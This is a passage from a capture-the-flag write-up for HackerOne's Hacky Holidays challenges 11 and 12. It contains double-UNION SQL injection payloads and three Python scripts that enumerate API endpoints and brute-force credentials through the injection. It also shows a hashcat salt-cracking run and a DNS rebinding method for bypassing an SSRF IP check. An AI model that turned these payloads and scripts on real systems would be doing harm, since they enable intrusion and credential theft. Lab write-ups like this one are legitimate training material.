&#x27;castilho&#x27; doesn&#x27;t exist on the album table.</span><br><span class="line"></span><br><span class="line">SELECT id, hash, name FROM album WHERE hash=&#x27;castilho&#x27; UNION SELECT &quot;custom_id&quot;,&quot;custom_hash&quot;,&quot;custom_name&quot;</span><br><span class="line">+-----------+-------------+-------------+</span><br><span class="line">| id        | hash        | name        |</span><br><span class="line">+-----------+-------------+-------------+</span><br><span class="line">| custom_id | custom_hash | custom_name |</span><br><span class="line">+-----------+-------------+-------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>UNION Example</strong></p>
<p>Let’s run a real example so we can see that it’s actually getting the customs values, for example, let’s change the <strong>album title</strong>.<br /><br>For that, we can access the following link with our payload - <code>x&#39; UNION SELECT null,null,&quot;castilho&quot;;</code></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=x%27%20UNION%20SELECT%20null,null,%22castilho%22;">https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=x’ UNION SELECT null,null,”castilho”;</a></li>
</ul>
<p><img src="/images/hackerone-ctf/flag11_title.png" alt="Flag 11 Title"></p>
<p>And this is what is going on in the back end :</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">--&gt; With UNION but &#x27;x&#x27; as the hash value </span><br><span class="line"> - We get only the custom values because the hash value &#x27;x&#x27; doesn&#x27;t exist on the album table.</span><br><span class="line"></span><br><span class="line">SELECT id, hash, name FROM album WHERE hash=&#x27;x&#x27; UNION SELECT null,null,&quot;castilho&quot;</span><br><span class="line">+------+------+----------+</span><br><span class="line">| id   | hash | name     |</span><br><span class="line">+------+------+----------+</span><br><span class="line">| null | null | castilho |</span><br><span class="line">+------+------+----------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>Note</strong>: The number of both SELECT statements must have the same number of columns, in this case, <strong>3 ( id, hash, name )</strong>. You can confirm this by adding an extra <code>null,</code> to the payload above, like so <code>x&#39; UNION SELECT null,null,null,&quot;castilho&quot;;</code>. If we send that payload, we’ll get a <code>404 Status Code</code>.</p>
<p><strong>How to exploit this issue</strong></p>
<p>Now with a better understanding of <code>UNION</code> and what’s going on in the background, we can exploit this issue by using <strong>double UNION</strong> for our final payload :</p>
<ul>
<li><code>castilho&#39; UNION SELECT &quot;castilho&#39; UNION SELECT null,null,&#39;../api/&#39;;&quot;,null,null;</code></li>
</ul>
<p>We can use that because not only is the <code>hash</code> parameter vulnerable to SQL Injection but we came to find that the Second query is also vulnerable to SQL Injection :</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT id, album_id, photo FROM photo WHERE album_id=&#x27;x&#x27; UNION SELECT null,null,&quot;castilho&quot;;</span><br><span class="line">+------+----------+----------+</span><br><span class="line">| id   | album_id | photo    |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">| null | null     | castilho |</span><br><span class="line">+------+----------+----------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>I’ve taken the time to make this image to explain a little better what is going on in the payload and on the backend :</p>
<p><img src="/images/hackerone-ctf/flag11_attacker.png" alt="Flag 11 Attacker"></p>
<p>Now, to confirm that our payload actually worked and we have a customs value on the <strong>image path</strong>, we can access the following link with our final payload - </p>
<ul>
<li><a target="_blank" rel="noopener" href="https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=castilho%27%20UNION%20SELECT%20%22castilho%27%20UNION%20SELECT%20null,null,%27../api/%27;%22,null,null;">https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=castilho’ UNION SELECT “castilho’ UNION SELECT null,null,’../api/‘;”,null,null;</a></li>
</ul>
<p>Then checking the source code of the page, we can retieve a <strong>/picture</strong> endpoint. Decoding the base64 value will get us :</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">castilho@box:~$ echo &quot;eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcLyIsImF1dGgiOiIwNWE3ZTcwOGE1ZjNkYTc2NTA2MDIzMDQ3NjI4ODI5ZCJ9&quot; | base64 -d</span><br><span class="line">&#123;&quot;image&quot;:&quot;r3c0n_server_4fdk59\/uploads\/..\/api\/&quot;,&quot;auth&quot;:&quot;05a7e708a5f3da76506023047628829d&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>Ok, so far we’ve successively exploited the double SQL Injection using a <strong>double UNION</strong> payload which got us to change the <strong>image path</strong> from the <strong>photo</strong> table and with that, make the server generate a valid hash for the new path.<br>Having a valid hash for our new image path, instead of getting <code>invalid authentication hash</code> on trying to access the link, we now get <code>Invalid content type detected</code>.</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">castilho@box:~$ curl https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcLyIsImF1dGgiOiIwNWE3ZTcwOGE1ZjNkYTc2NTA2MDIzMDQ3NjI4ODI5ZCJ9</span><br><span class="line">Invalid content type detected</span><br></pre></td></tr></table></figure>

<p>So using the <strong>double UNION</strong> payload to get valid hashes, we now use the <strong>image path</strong> to enumerate the <code>/api/*</code> endpoint. To do this, I’ve made the following <strong>Python Script</strong> :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># Target</span></span><br><span class="line">target  = <span class="string">&quot;https://hackyholidays.h1ctf.com&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Variables</span></span><br><span class="line">PAYLOAD  = <span class="string">&quot;/r3c0n_server_4fdk59/album?hash=castilho&#x27; UNION SELECT \&quot;&#x27; UNION SELECT null,null,&#x27;../api/%s&#x27;;\&quot;,null,null;&quot;</span></span><br><span class="line">MESSAGE  = <span class="string">&quot;Invalid content type detected&quot;</span></span><br><span class="line">WORDLIST = <span class="string">&quot;api_endpoints.txt&quot;</span></span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&quot;clear&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n\t--== Flag 11 API Enum Exploit ==--\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Function to read values from wordlist</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_api_endpoints</span>(<span class="params">wordlist</span>):</span></span><br><span class="line"></span><br><span class="line">    endpoints = []</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Loop throw the values of wordlist</span></span><br><span class="line">    <span class="comment"># And store them on &#x27;endpoints&#x27; array</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(wordlist, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> api_endpoints:</span><br><span class="line">        <span class="keyword">for</span> api_endpoint <span class="keyword">in</span> api_endpoints:</span><br><span class="line">            endpoints.append(api_endpoint.strip())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> endpoints <span class="comment"># Return API endpoints</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Function to enumerate the /api/* endpoint</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">api_enum</span>(<span class="params">payload, wordlist, response_content</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Load API endpoints into &#x27;api_endpoints_wordlist&#x27; array</span></span><br><span class="line">    api_endpoints_wordlist = read_api_endpoints(wordlist)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\t[+] API Endpoints Wordlist loaded, starting ...\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Loop throw the API Endpoints and make a request to see if each exist    in api_endpoints_wordlist:</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Send out our target + payload + possible API Endpoint</span></span><br><span class="line">        album_response = requests.get(target + payload % api_endpoint)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># Get the endpoint inside the `img src=`</span></span><br><span class="line">            image_source   = re.findall(<span class="string">&#x27;&lt;img class=&quot;img-responsive&quot; src=&quot;(.*)&quot;&gt;&#x27;</span>, album_response.text)</span><br><span class="line">            image_endpoint = image_source[<span class="number">0</span>]</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># Make a request to that endpoint to see check his response</span></span><br><span class="line">            img_endpoint_response = requests.get(target + image_endpoint)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># If the response equals our &quot;MESSAGE&quot;, then we&#x27;ve found a Endpoint</span></span><br><span class="line">            <span class="keyword">if</span> img_endpoint_response.text == response_content:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;\t   - API Endpoint found: /%s&quot;</span> % api_endpoint)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    </span><br><span class="line"><span class="comment"># ==============================================================================================================================</span></span><br><span class="line"><span class="comment"># Challenge &#x27;Flag 11 API Enum Exploit&#x27; starts here</span></span><br><span class="line">api_enum(PAYLOAD, WORDLIST, MESSAGE)</span><br></pre></td></tr></table></figure>

<p>The script does the following :</p>
<ul>
<li>Load the api_endpoints.txt wordlist</li>
<li>Using our <strong>double UNION</strong> payload, changes the image path to ../api/WORDLIST_VALUE</li>
<li>Scrape the image source link out of the source code</li>
<li>Check the link response if it’s a valid endpoint</li>
<li>Loop throw all the wordlist values</li>
</ul>
<p><img src="/images/hackerone-ctf/flag11_api.gif" alt="Flag 11 API"></p>
<p>Great, we have now <strong>2 endpoints</strong>, <code>/api/user</code> and <code>/api/ping</code>. The next step is to perform parameter enumeration.<br /><br>For this, we can actually use the script above just by making some modifications to our main variables to find params on <code>../api/user</code> :</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">New variable values :</span><br><span class="line"></span><br><span class="line"># Variables</span><br><span class="line">PAYLOAD  = &quot;/r3c0n_server_4fdk59/album?hash=castilho&#x27; UNION SELECT \&quot;&#x27; UNION SELECT null,null,&#x27;../api/user?%s&#x27;;\&quot;,null,null;&quot;</span><br><span class="line">MESSAGE  = &quot;Expected HTTP status 200, Received: 204&quot;</span><br><span class="line">WORDLIST = &quot;params.txt&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># Target</span></span><br><span class="line">target  = <span class="string">&quot;https://hackyholidays.h1ctf.com&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Variables</span></span><br><span class="line">PAYLOAD  = <span class="string">&quot;/r3c0n_server_4fdk59/album?hash=castilho&#x27; UNION SELECT \&quot;&#x27; UNION SELECT null,null,&#x27;../api/user?%s&#x27;;\&quot;,null,null;&quot;</span></span><br><span class="line">MESSAGE  = <span class="string">&quot;Expected HTTP status 200, Received: 204&quot;</span></span><br><span class="line">WORDLIST = <span class="string">&quot;params.txt&quot;</span></span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&quot;clear&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n\t--== Flag 11 Parameters Enum Exploit ==--\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Function to read values from wordlist</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_params</span>(<span class="params">wordlist</span>):</span></span><br><span class="line"></span><br><span class="line">    endpoints = []</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Loop throw the values of wordlist</span></span><br><span class="line">    <span class="comment"># And store them on &#x27;endpoints&#x27; array</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(wordlist, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> params:</span><br><span class="line">        <span class="keyword">for</span> param <span class="keyword">in</span> params:</span><br><span class="line">            endpoints.append(param.strip())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> endpoints <span class="comment"># Return parameters</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Function to look for params on the /api/* endpoint</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">param_enum</span>(<span class="params">payload, wordlist, response_content</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Load parameters into &#x27;params_wordlist&#x27; array</span></span><br><span class="line">    params_wordlist = read_params(wordlist)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\t[+] Parameters Wordlist loaded, starting ...\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Loop throw the parameters and make a request to see if each exist</span></span><br><span class="line">    <span class="keyword">for</span> param <span class="keyword">in</span> params_wordlist:</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Send out our target + payload + possible param</span></span><br><span class="line">        album_response = requests.get(target + payload % param)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Get the endpoint inside the `img src=`</span></span><br><span class="line">            image_source   = re.findall(<span class="string">&#x27;&lt;img class=&quot;img-responsive&quot; src=&quot;(.*)&quot;&gt;&#x27;</span>, album_response.text)</span><br><span class="line">            image_endpoint = image_source[<span class="number">0</span>]</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># Make a request to that endpoint to see check his response</span></span><br><span class="line">            img_endpoint_response = requests.get(target + image_endpoint)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># If the response equals our &quot;MESSAGE&quot;, then we&#x27;ve found a param</span></span><br><span class="line">            <span class="keyword">if</span> img_endpoint_response.text == response_content:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;\t   - Parameter found: %s&quot;</span> % param)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==============================================================================================================================</span></span><br><span class="line"><span class="comment"># Challenge &#x27;Flag 11 Parameter Exploit&#x27; starts here</span></span><br><span class="line">param_enum(PAYLOAD, WORDLIST, MESSAGE)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/images/hackerone-ctf/flag11_param.gif" alt="Flag 11 Param"></p>
<p>With the parameters discovered and the last and final step, is to find the <code>username</code> and <code>password</code> value.<br /><br>To do this we’ll be using wildcards, specifically <code>%</code>.</p>
<blockquote>
<p>A wildcard character is used to substitute one or more characters in a string. You can find examples <a target="_blank" rel="noopener" href="https://www.tutorialspoint.com/sql/sql-wildcards.htm">here</a>.</p>
</blockquote>
<p>So, to brute-force the credentials, I’ve made a final script Python script :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># Target</span></span><br><span class="line">target  = <span class="string">&quot;https://hackyholidays.h1ctf.com&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Variables</span></span><br><span class="line">PAYLOAD   = <span class="string">&quot;/r3c0n_server_4fdk59/album?hash=castilho&#x27; UNION SELECT \&quot;&#x27; UNION SELECT null,null,&#x27;../api/user?%s=%s&#x27;;\&quot;,null,null;&quot;</span></span><br><span class="line">MESSAGE   = <span class="string">&quot;Invalid content type detected&quot;</span></span><br><span class="line">CHAR_LIST = <span class="built_in">list</span>(<span class="string">&quot;abcdefghijklmnopqrstuvwxyz1234567890&quot;</span>)</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&quot;clear&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n\t--== Flag 11 Username/Password Brute-force Exploit ==--&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Function to brute force value of parameteres using wilcard %</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">value_bruteforce</span>(<span class="params">payload, characters, response_content, param</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Data retrieved</span></span><br><span class="line">    data_retrieved = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n\t[+] Brute-forcing value of %s ...\n&quot;</span> % param)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>: <span class="comment"># Loop until no data is retrieved</span></span><br><span class="line">        <span class="keyword">for</span> character <span class="keyword">in</span> characters: <span class="comment"># Loop throw characters</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># Send out our target + payload + param + data_retrieved + data_retrieved %</span></span><br><span class="line">            album_response = requests.get(target + payload % (param, data_retrieved + character + <span class="string">&quot;%&quot;</span>))</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">                <span class="comment"># Get the endpoint inside the `img src=`</span></span><br><span class="line">                image_source   = re.findall(<span class="string">&#x27;&lt;img class=&quot;img-responsive&quot; src=&quot;(.*)&quot;&gt;&#x27;</span>, album_response.text)</span><br><span class="line">                image_endpoint = image_source[<span class="number">0</span>]</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># Make a request to that endpoint to see check his response</span></span><br><span class="line">                img_endpoint_response = requests.get(target + image_endpoint)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># If the response equals our &quot;MESSAGE&quot;, then we&#x27;ve found a param</span></span><br><span class="line">                <span class="keyword">if</span> img_endpoint_response.text == response_content:</span><br><span class="line">                    data_retrieved += character <span class="comment"># Add character to &quot;data_retrieved&quot; </span></span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;\t   - Char Found --&gt; %s&quot;</span> % data_retrieved)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> character == <span class="string">&quot;0&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> data_retrieved <span class="comment"># Return param value</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==============================================================================================================================</span></span><br><span class="line"><span class="comment"># Program &#x27;Flag 11 Username/Password Brute-force Exploit&#x27; starts here</span></span><br><span class="line">username = value_bruteforce(PAYLOAD, CHAR_LIST, MESSAGE, <span class="string">&quot;username&quot;</span>)</span><br><span class="line">password = value_bruteforce(PAYLOAD, CHAR_LIST, MESSAGE, <span class="string">&quot;password&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Print out credentials</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n\t[+] Credentials: %s:%s\n&quot;</span> % (username,password))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/images/hackerone-ctf/flag11_creds.gif" alt="Flag 11 Creds"></p>
<p>To finalize this crazy challenge, with our credencials <code>grinchadmin:s4nt4sucks</code> we can now login into the <code>/attack-box</code> and with this retrieve the eleventh flag :</p>
<p><img src="/images/hackerone-ctf/flag11_flag.png" alt="Flag 11 Flag"></p>
<h3 id="Flag-12-Rebinding-Christmas"><a href="#Flag-12-Rebinding-Christmas" class="headerlink" title="Flag 12 | Rebinding Christmas"></a>Flag 12 | Rebinding Christmas</h3><p>So now inside the <strong>Grinch attack-box</strong> the last step is to take down <strong>Grinch-Networks</strong>, so without hesitating let’s finish this !<br>Starting with our usual scan with, you guessed it, ffuf, unfortunately, didn’t return us any interesting results, so let’s start checking the source code of the home page.<br /><br>The home page has <strong>3 buttons</strong> on what seems to be the <strong>Launch DDOS Attack</strong> buttons. Next to them, we have <strong>3 IPs</strong> on what seems to be the Santa’s Servers.</p>
<p><img src="/images/hackerone-ctf/flag12_buttons.png" alt="Flag 12 Buttons"></p>
<p>To see what these buttons are doing, by looking into the <strong>source-code</strong>, we can retrieve an interesting endpoint with what seems to be a base64 encoded value :</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==</span><br></pre></td></tr></table></figure>

<p>Decoding the base64 value we get: <code>&#123;&quot;target&quot;:&quot;203.0.113.33&quot;,&quot;hash&quot;:&quot;5f2940d65ca4140cc18d0878bc398955&quot;&#125;</code></p>
<p>So we just have to change the <code>203.0.113.33</code> value into <code>127.0.0.1</code>, send it and Christmas is saved right? Well, it’s not that simple.<br /><br>Turning it into <code>127.0.0.1</code>, encoding it, and sending it’ll get us the following error :</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invalid Protection Hash</span><br></pre></td></tr></table></figure>

<p>From this error, we can guess there’s some validation going on with the hash and value. So the next thing to do is to crack the MD5 hash !<br /><br>To do that, we’ll be using the famous tool, hashcat. So firing up our terminal we insert the following command :</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">castilho@box:~$ hashcat -m 10 5f2940d65ca4140cc18d0878bc398955:203.0.113.33 rockyou.txt</span><br><span class="line"></span><br><span class="line">Dictionary cache hit:</span><br><span class="line"> Filename..: rockyou.txt</span><br><span class="line"> Passwords.: 14344384</span><br><span class="line"> Bytes.....: 139921497</span><br><span class="line"> Keyspace..: 14344384</span><br><span class="line"></span><br><span class="line">5f2940d65ca4140cc18d0878bc398955:203.0.113.33:mrgrinch463</span><br><span class="line"></span><br><span class="line">Started: Tue Dec 29 04:57:47 2020</span><br><span class="line">Stopped: Tue Dec 29 04:57:53 2020</span><br></pre></td></tr></table></figure>

<p><strong>Note:</strong> Flags in use :</p>
<ul>
<li><strong>-m 10</strong> = What type of Hash is it. In this case, it’s a Salted MD5 Hash</li>
<li><strong>5f2940d65ca4140cc18d0878bc398955</strong> = Our Hash</li>
<li><strong>203.0.113.33</strong> = The string of the hash (we can guess this is the string of how it’s validating with the “target” value)</li>
<li><strong>rockyou.txt</strong> = Wordlist to brute force the salt of the hash</li>
</ul>
<p>And looks like <code>mrgrinch463</code> is our salt! Great, so now we just have to regenerate a hash with our new string <code>127.0.0.1</code> using our salt, change the target value to <code>127.0.0.1</code>, encode the payload, send it, and Christmas is saved, right? Well, it’s still not that simple. If we do that, the <strong>attack-box</strong> will detect that we are targeting itself :</p>
<p><img src="/images/hackerone-ctf/flag12_ssrf.png" alt="Flag 12 SSRF"></p>
<p>With this information, we can see there’s some IP validation going on. We can bypass this protection by using <strong>DNS Rebinding</strong>.<br /><br>But what is <strong>DNS Rebinding</strong> ? Well, allow me to explain :</p>
<blockquote>
<p>In the context of SSRF bugs, DNS rebinding is a well-known technique targeting TOCTOU type of vulnerabilities during IP blacklisting or whitelisting. It is performed using a domain that resolves in a legit IP during the first request (check) and to the forbidden one during the second request (use).</p>
</blockquote>
<p>You can read more about it <a target="_blank" rel="noopener" href="https://danielmiessler.com/blog/dns-rebinding-explained/">here</a>.<br /><br>For this attack, we’ll be using this <a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html">service</a>.<br /><br>Checking out the <strong>service</strong> page, there’s 2 inputs : </p>
<ul>
<li><strong>A IP</strong> (The legit IP, in this case 203.0.113.33)</li>
<li><strong>B IP</strong> (The forbidden IP, in this case 127.0.0.1)</li>
</ul>
<p>Once inserted the values, we’ll get our link for the <strong>DNS Rebinding</strong> : <code>cb007121.7f000001.rbndr.us</code>.<br /><br>Creating a new hash but now with the link, we’ll get us <code>aa9c061c933f709acb4d69329bc7b1af</code> :</p>
